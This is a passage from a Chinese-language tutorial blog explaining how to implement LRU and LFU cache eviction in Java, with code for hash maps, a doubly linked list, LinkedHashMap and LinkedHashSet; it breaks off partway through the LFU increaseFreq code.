只能从尾部插入，也就是说靠尾部的数据是最近使用的，靠头部的数据是最久为使用的</strong>。</p><p>有了双向链表的实现，我们只需要在 LRU 算法中把它和哈希表结合起来即可，先搭出代码框架：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LRUCache</span> </span>&#123;<br>    <span class="hljs-comment">// key -&gt; Node(key, val)</span><br>    <span class="hljs-keyword">private</span> HashMap&lt;Integer, Node&gt; map;<br>    <span class="hljs-comment">// Node(k1, v1) &lt;-&gt; Node(k2, v2)...</span><br>    <span class="hljs-keyword">private</span> DoubleList cache;<br>    <span class="hljs-comment">// 最大容量</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> cap;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">LRUCache</span><span class="hljs-params">(<span class="hljs-keyword">int</span> capacity)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.cap = capacity;<br>        map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        cache = <span class="hljs-keyword">new</span> DoubleList();<br>    &#125;<br></code></pre></td></tr></table></figure><p>先不慌去实现 LRU 算法的 <code>get</code> 和 <code>put</code> 方法。由于我们要同时维护一个双链表 <code>cache</code> 和一个哈希表 <code>map</code>，很容易漏掉一些操作，比如说删除某个 <code>key</code> 时，在 <code>cache</code> 中删除了对应的 <code>Node</code>，但是却忘记在 <code>map</code> 中删除 <code>key</code>。</p><p><strong>解决这种问题的有效方法是：在这两种数据结构之上提供一层抽象 API</strong>。</p><p>说的有点玄幻，实际上很简单，就是尽量让 LRU 的主方法 <code>get</code> 和 <code>put</code> 避免直接操作 <code>map</code> 和 <code>cache</code> 的细节。我们可以先实现下面几个函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/* 将某个 key 提升为最近使用的 */</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">makeRecently</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key)</span> </span>&#123;<br>    Node x = map.get(key);<br>    <span class="hljs-comment">// 先从链表中删除这个节点</span><br>    cache.remove(x);<br>    <span class="hljs-comment">// 重新插到队尾</span><br>    cache.addLast(x);<br>&#125;<br><br><span class="hljs-comment">/* 添加最近使用的元素 */</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addRecently</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key, <span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>    Node x = <span class="hljs-keyword">new</span> Node(key, val);<br>    <span class="hljs-comment">// 链表尾部就是最近使用的元素</span><br>    cache.addLast(x);<br>    <span class="hljs-comment">// 别忘了在 map 中添加 key 的映射</span><br>    map.put(key, x);<br>&#125;<br><br><span class="hljs-comment">/* 删除某一个 key */</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deleteKey</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key)</span> </span>&#123;<br>    Node x = map.get(key);<br>    <span class="hljs-comment">// 从链表中删除</span><br>    cache.remove(x);<br>    <span class="hljs-comment">// 从 map 中删除</span><br>    map.remove(key);<br>&#125;<br><br><span class="hljs-comment">/* 删除最久未使用的元素 */</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">removeLeastRecently</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 链表头部的第一个元素就是最久未使用的</span><br>    Node deletedNode = cache.removeFirst();<br>    <span class="hljs-comment">// 同时别忘了从 map 中删除它的 key</span><br>    <span class="hljs-keyword">int</span> deletedKey = deletedNode.key;<br>    map.remove(deletedKey);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里就能回答之前的问答题「为什么要在链表中同时存储 key 和 val，而不是只存储 val」，注意 <code>removeLeastRecently</code> 函数中，我们需要用 <code>deletedNode</code> 得到 <code>deletedKey</code>。</p><p>也就是说，当缓存容量已满，我们不仅仅要删除最后一个 <code>Node</code> 节点，还要把 <code>map</code> 中映射到该节点的 <code>key</code> 同时删除，而这个 <code>key</code> 只能由 <code>Node</code> 得到。如果 <code>Node</code> 结构中只存储 <code>val</code>，那么我们就无法得知 <code>key</code> 是什么，就无法删除 <code>map</code> 中的键，造成错误。</p><p>上述方法就是简单的操作封装，调用这些函数可以避免直接操作 <code>cache</code> 链表和 <code>map</code> 哈希表，下面我先来实现 LRU 算法的 <code>get</code> 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!map.containsKey(key)) &#123;<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-comment">// 将该数据提升为最近使用的</span><br>    makeRecently(key);<br>    <span class="hljs-keyword">return</span> map.get(key).val;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>put</code> 方法稍微复杂一些，我们先来画个图搞清楚它的逻辑：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/LRU_put.jpg" alt="LRU_put" style="zoom:50%;" /></p><p>这样我们可以轻松写出 <code>put</code> 方法的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">put</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key, <span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (map.containsKey(key)) &#123;<br>        <span class="hljs-comment">// 删除旧的数据</span><br>        deleteKey(key);<br>        <span class="hljs-comment">// 新插入的数据为最近使用的数据</span><br>        addRecently(key, val);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (cap == cache.size()) &#123;<br>        <span class="hljs-comment">// 删除最久未使用的元素</span><br>        removeLeastRecently();<br>    &#125;<br>    <span class="hljs-comment">// 添加为最近使用的元素</span><br>    addRecently(key, val);<br>&#125;<br></code></pre></td></tr></table></figure><p>至此，你应该已经完全掌握 LRU 算法的原理和实现了，我们最后用 Java 的内置类型 <code>LinkedHashMap</code> 来实现 LRU 算法，逻辑和之前完全一致，我就不过多解释了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LRUCache</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> cap;<br>    LinkedHashMap&lt;Integer, Integer&gt; cache = <span class="hljs-keyword">new</span> LinkedHashMap&lt;&gt;();<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">LRUCache</span><span class="hljs-params">(<span class="hljs-keyword">int</span> capacity)</span> </span>&#123; <br>        <span class="hljs-keyword">this</span>.cap = capacity;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!cache.containsKey(key)) &#123;<br>            <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-comment">// 将 key 变为最近使用</span><br>        makeRecently(key);<br>        <span class="hljs-keyword">return</span> cache.get(key);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">put</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key, <span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (cache.containsKey(key)) &#123;<br>            <span class="hljs-comment">// 修改 key 的值</span><br>            cache.put(key, val);<br>            <span class="hljs-comment">// 将 key 变为最近使用</span><br>            makeRecently(key);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (cache.size() &gt;= <span class="hljs-keyword">this</span>.cap) &#123;<br>            <span class="hljs-comment">// 链表头部就是最久未使用的 key</span><br>            <span class="hljs-keyword">int</span> oldestKey = cache.keySet().iterator().next();<br>            cache.remove(oldestKey);<br>        &#125;<br>        <span class="hljs-comment">// 将新的 key 添加链表尾部</span><br>        cache.put(key, val);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">makeRecently</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> val = cache.get(key);<br>        <span class="hljs-comment">// 删除 key，重新插入到队尾</span><br>        cache.remove(key);<br>        cache.put(key, val);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="3-LFU算法"><a href="#3-LFU算法" class="headerlink" title="3. LFU算法"></a>3. LFU算法</h1><p>从实现难度上来说，LFU 算法的难度大于 LRU 算法，因为 LRU 算法相当于把数据按照时间排序，这个需求借助链表很自然就能实现，你一直从链表头部加入元素的话，越靠近头部的元素就是新的数据，越靠近尾部的元素就是旧的数据，我们进行缓存淘汰的时候只要简单地将尾部的元素淘汰掉就行了。</p><p>而 LFU 算法相当于是淘汰访问频次最低的数据，如果访问频次最低的数据有多条，需要淘汰最旧的数据。把数据按照访问频次进行排序，而且频次还会不断变化，这可不容易实现。</p><p><strong>话说回来，这种著名的算法的套路都是固定的，关键是由于逻辑较复杂，不容易写出漂亮且没有 bug 的代码</strong>。</p><h2 id="3-1-算法描述"><a href="#3-1-算法描述" class="headerlink" title="3.1 算法描述"></a>3.1 算法描述</h2><p>要求你写一个类，接受一个<code>capacity</code>参数，实现<code>get</code>和<code>put</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LFUCache</span> </span>&#123;<br>    <span class="hljs-comment">// 构造容量为 capacity 的缓存</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">LFUCache</span><span class="hljs-params">(<span class="hljs-keyword">int</span> capacity)</span> </span>&#123;&#125;<br>    <span class="hljs-comment">// 在缓存中查询 key</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key)</span> </span>&#123;&#125;<br>    <span class="hljs-comment">// 将 key 和 val 存入缓存</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">put</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key, <span class="hljs-keyword">int</span> val)</span> </span>&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>get(key)</code>方法会去缓存中查询键<code>key</code>，如果<code>key</code>存在，则返回<code>key</code>对应的<code>val</code>，否则返回 -1。</p><p><code>put(key, value)</code>方法插入或修改缓存。如果<code>key</code>已存在，则将它对应的值改为<code>val</code>；如果<code>key</code>不存在，则插入键值对<code>(key, val)</code>。</p><p>当缓存达到容量<code>capacity</code>时，则应该在插入新的键值对之前，删除使用频次（后文用<code>freq</code>表示）最低的键值对。如果<code>freq</code>最低的键值对有多个，则删除其中最旧的那个。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 构造一个容量为 2 的 LFU 缓存</span><br>LFUCache cache = <span class="hljs-keyword">new</span> LFUCache(<span class="hljs-number">2</span>);<br><br><span class="hljs-comment">// 插入两对 (key, val)，对应的 freq 为 1</span><br>cache.put(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>);<br>cache.put(<span class="hljs-number">2</span>, <span class="hljs-number">20</span>);<br><br><span class="hljs-comment">// 查询 key 为 1 对应的 val</span><br><span class="hljs-comment">// 返回 10，同时键 1 对应的 freq 变为 2</span><br>cache.get(<span class="hljs-number">1</span>);<br><br><span class="hljs-comment">// 容量已满，淘汰 freq 最小的键 2</span><br><span class="hljs-comment">// 插入键值对 (3, 30)，对应的 freq 为 1</span><br>cache.put(<span class="hljs-number">3</span>, <span class="hljs-number">30</span>);   <br><br><span class="hljs-comment">// 键 2 已经被淘汰删除，返回 -1</span><br>cache.get(<span class="hljs-number">2</span>); <br></code></pre></td></tr></table></figure><h2 id="3-2-思路分析"><a href="#3-2-思路分析" class="headerlink" title="3.2 思路分析"></a>3.2 思路分析</h2><p>一定先从最简单的开始，根据 LFU 算法的逻辑，我们先列举出算法执行过程中的几个显而易见的事实：</p><p>1、调用<code>get(key)</code>方法时，要返回该<code>key</code>对应的<code>val</code>。</p><p>2、只要用<code>get</code>或者<code>put</code>方法访问一次某个<code>key</code>，该<code>key</code>的<code>freq</code>就要加一。</p><p>3、如果在容量满了的时候进行插入，则需要将<code>freq</code>最小的<code>key</code>删除，如果最小的<code>freq</code>对应多个<code>key</code>，则删除其中最旧的那一个。</p><p>好的，我们希望能够在 O(1) 的时间内解决这些需求，可以使用基本数据结构来逐个击破：</p><p><strong>1、</strong>使用一个<code>HashMap</code>存储<code>key</code>到<code>val</code>的映射，就可以快速计算<code>get(key)</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;Integer, Integer&gt; keyToVal;<br></code></pre></td></tr></table></figure><p><strong>2、</strong>使用一个<code>HashMap</code>存储<code>key</code>到<code>freq</code>的映射，就可以快速操作<code>key</code>对应的<code>freq</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;Integer, Integer&gt; keyToFreq;<br></code></pre></td></tr></table></figure><p><strong>3、</strong>这个需求应该是 LFU 算法的核心，所以我们分开说。</p><p><strong>3.1</strong>、首先，肯定是需要<code>freq</code>到<code>key</code>的映射，用来找到<code>freq</code>最小的<code>key</code>。</p><p><strong>3.2、</strong>将<code>freq</code>最小的<code>key</code>删除，那你就得快速得到当前所有<code>key</code>最小的<code>freq</code>是多少。想要时间复杂度 O(1) 的话，肯定不能遍历一遍去找，那就用一个变量<code>minFreq</code>来记录当前最小的<code>freq</code>吧。</p><p><strong>3.3、</strong>可能有多个<code>key</code>拥有相同的<code>freq</code>，所以 <strong><code>freq</code>对<code>key</code>是一对多的关系</strong>，即一个<code>freq</code>对应一个<code>key</code>的列表。</p><p><strong>3.4、</strong>希望<code>freq</code>对应的<code>key</code>的列表是<strong>存在时序</strong>的，便于快速查找并删除最旧的<code>key</code>。</p><p><strong>3.5、</strong>希望<strong>能够快速删除<code>key</code>列表中的任何一个<code>key</code></strong>，因为如果频次为<code>freq</code>的某个<code>key</code>被访问，那么它的频次就会变成<code>freq+1</code>，就应该从<code>freq</code>对应的<code>key</code>列表中删除，加到<code>freq+1</code>对应的<code>key</code>的列表中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;Integer, LinkedHashSet&lt;Integer&gt;&gt; freqToKeys;<br><span class="hljs-keyword">int</span> minFreq = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>介绍一下这个<code>LinkedHashSet</code>，它满足我们 3.3，3.4，3.5 这几个要求。你会发现普通的链表<code>LinkedList</code>能够满足 3.3，3.4 这两个要求，但是由于普通链表不能快速访问链表中的某一个节点，所以无法满足 3.5 的要求。</p><p><code>LinkedHashSet</code>顾名思义，是链表和哈希集合的结合体。链表不能快速访问链表节点，但是插入元素具有时序；哈希集合中的元素无序，但是可以对元素进行快速的访问和删除。</p><p>那么，它俩结合起来就兼具了哈希集合和链表的特性，既可以在 O(1) 时间内访问或删除其中的元素，又可以保持插入的时序，高效实现 3.5 这个需求。</p><p>综上，我们可以写出 LFU 算法的基本数据结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LFUCache</span> </span>&#123;<br>    <span class="hljs-comment">// key 到 val 的映射，我们后文称为 KV 表</span><br>    HashMap&lt;Integer, Integer&gt; keyToVal;<br>    <span class="hljs-comment">// key 到 freq 的映射，我们后文称为 KF 表</span><br>    HashMap&lt;Integer, Integer&gt; keyToFreq;<br>    <span class="hljs-comment">// freq 到 key 列表的映射，我们后文称为 FK 表</span><br>    HashMap&lt;Integer, LinkedHashSet&lt;Integer&gt;&gt; freqToKeys;<br>    <span class="hljs-comment">// 记录最小的频次</span><br>    <span class="hljs-keyword">int</span> minFreq;<br>    <span class="hljs-comment">// 记录 LFU 缓存的最大容量</span><br>    <span class="hljs-keyword">int</span> cap;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">LFUCache</span><span class="hljs-params">(<span class="hljs-keyword">int</span> capacity)</span> </span>&#123;<br>        keyToVal = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        keyToFreq = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        freqToKeys = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        <span class="hljs-keyword">this</span>.cap = capacity;<br>        <span class="hljs-keyword">this</span>.minFreq = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key)</span> </span>&#123;&#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">put</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key, <span class="hljs-keyword">int</span> val)</span> </span>&#123;&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-3-代码框架"><a href="#3-3-代码框架" class="headerlink" title="3.3 代码框架"></a>3.3 代码框架</h2><p>LFU 的逻辑不难理解，但是写代码实现并不容易，因为你看我们要维护<code>KV</code>表，<code>KF</code>表，<code>FK</code>表三个映射，特别容易出错。对于这种情况，labuladong 教你三个技巧：</p><p><strong>1、</strong>不要企图上来就实现算法的所有细节，而应该自顶向下，逐步求精，先写清楚主函数的逻辑框架，然后再一步步实现细节。</p><p><strong>2、</strong>搞清楚映射关系，如果我们更新了某个<code>key</code>对应的<code>freq</code>，那么就要同步修改<code>KF</code>表和<code>FK</code>表，这样才不会出问题。</p><p><strong>3、</strong>画图，画图，画图，重要的话说三遍，把逻辑比较复杂的部分用流程图画出来，然后根据图来写代码，可以极大减少出错的概率。</p><p>下面我们先来实现<code>get(key)</code>方法，逻辑很简单，返回<code>key</code>对应的<code>val</code>，然后增加<code>key</code>对应的<code>freq</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!keyToVal.containsKey(key)) &#123;<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-comment">// 增加 key 对应的 freq</span><br>    increaseFreq(key);<br>    <span class="hljs-keyword">return</span> keyToVal.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>增加<code>key</code>对应的<code>freq</code>是 LFU 算法的核心，所以我们干脆直接抽象成一个函数<code>increaseFreq</code>，这样<code>get</code>方法看起来就简洁清晰了对吧。</p><p>下面来实现<code>put(key, val)</code>方法，逻辑略微复杂，我们直接画个图来看：</p><p>这图就是随手画的，不是什么正规的程序流程图，但是算法逻辑一目了然，看图可以直接写出<code>put</code>方法的逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">put</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key, <span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.cap &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-comment">/* 若 key 已存在，修改对应的 val 即可 */</span><br>    <span class="hljs-keyword">if</span> (keyToVal.containsKey(key)) &#123;<br>        keyToVal.put(key, val);<br>        <span class="hljs-comment">// key 对应的 freq 加一</span><br>        increaseFreq(key);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* key 不存在，需要插入 */</span><br>    <span class="hljs-comment">/* 容量已满的话需要淘汰一个 freq 最小的 key */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.cap &lt;= keyToVal.size()) &#123;<br>        removeMinFreqKey();<br>    &#125;<br><br>    <span class="hljs-comment">/* 插入 key 和 val，对应的 freq 为 1 */</span><br>    <span class="hljs-comment">// 插入 KV 表</span><br>    keyToVal.put(key, val);<br>    <span class="hljs-comment">// 插入 KF 表</span><br>    keyToFreq.put(key, <span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// 插入 FK 表</span><br>    freqToKeys.putIfAbsent(<span class="hljs-number">1</span>, <span class="hljs-keyword">new</span> LinkedHashSet&lt;&gt;());<br>    freqToKeys.get(<span class="hljs-number">1</span>).add(key);<br>    <span class="hljs-comment">// 插入新 key 后最小的 freq 肯定是 1</span><br>    <span class="hljs-keyword">this</span>.minFreq = <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>increaseFreq</code>和<code>removeMinFreqKey</code>方法是 LFU 算法的核心，我们下面来看看怎么借助<code>KV</code>表，<code>KF</code>表，<code>FK</code>表这三个映射巧妙完成这两个函数。</p><h2 id="3-4-LFU-核心逻辑"><a href="#3-4-LFU-核心逻辑" class="headerlink" title="3.4 LFU 核心逻辑"></a>3.4 LFU 核心逻辑</h2><p>首先来实现<code>removeMinFreqKey</code>函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">removeMinFreqKey</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// freq 最小的 key 列表</span><br>    LinkedHashSet&lt;Integer&gt; keyList = freqToKeys.get(<span class="hljs-keyword">this</span>.minFreq);<br>    <span class="hljs-comment">// 其中最先被插入的那个 key 就是该被淘汰的 key</span><br>    <span class="hljs-keyword">int</span> deletedKey = keyList.iterator().next();<br>    <span class="hljs-comment">/* 更新 FK 表 */</span><br>    keyList.remove(deletedKey);<br>    <span class="hljs-keyword">if</span> (keyList.isEmpty()) &#123;<br>        freqToKeys.remove(<span class="hljs-keyword">this</span>.minFreq);<br>        <span class="hljs-comment">// 问：这里需要更新 minFreq 的值吗？</span><br>    &#125;<br>    <span class="hljs-comment">/* 更新 KV 表 */</span><br>    keyToVal.remove(deletedKey);<br>    <span class="hljs-comment">/* 更新 KF 表 */</span><br>    keyToFreq.remove(deletedKey);<br>&#125;<br></code></pre></td></tr></table></figure><p>删除某个键<code>key</code>肯定是要同时修改三个映射表的，借助<code>minFreq</code>参数可以从<code>FK</code>表中找到<code>freq</code>最小的<code>keyList</code>，根据时序，其中第一个元素就是要被淘汰的<code>deletedKey</code>，操作三个映射表删除这个<code>key</code>即可。</p><p>但是有个细节问题，如果<code>keyList</code>中只有一个元素，那么删除之后<code>minFreq</code>对应的<code>key</code>列表就为空了，也就是<code>minFreq</code>变量需要被更新。如何计算当前的<code>minFreq</code>是多少呢？</p><p>实际上没办法快速计算<code>minFreq</code>，只能线性遍历<code>FK</code>表或者<code>KF</code>表来计算，这样肯定不能保证 O(1) 的时间复杂度。</p><p><strong>但是，其实这里没必要更新<code>minFreq</code>变量</strong>，因为你想想<code>removeMinFreqKey</code>这个函数是在什么时候调用？在<code>put</code>方法中插入新<code>key</code>时可能调用。而你回头看<code>put</code>的代码，插入新<code>key</code>时一定会把<code>minFreq</code>更新成 1，所以说即便这里<code>minFreq</code>变了，我们也不需要管它。</p><p>下面来实现<code>increaseFreq</code>函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 